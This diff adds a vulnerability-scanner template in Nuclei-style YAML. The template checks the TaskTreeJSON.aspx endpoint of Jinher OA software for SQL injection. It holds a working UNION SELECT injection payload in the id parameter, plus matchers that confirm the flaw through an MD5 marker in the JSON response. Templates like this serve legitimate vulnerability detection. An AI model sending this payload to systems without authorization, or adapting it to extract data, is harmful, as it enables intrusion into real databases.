@@ -1,0 +1,26 @@
+id: poc-yaml-jinher-tasktreejson-aspx-sqli
+info:
+  name: TaskTreeJSON.aspx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/C6/JHSoft.Web.DailyTaskManage/TaskTreeJSON.aspx/?id=1%27+union+all+select+null%2C%28select+sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--+"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "contains(body, concat('0x', t2))"
+          - "contains(body, '\"permissions\":true')"
+          - "!contains(body, '<')"
+          - "contains(header['content-type'], 'application/json')"
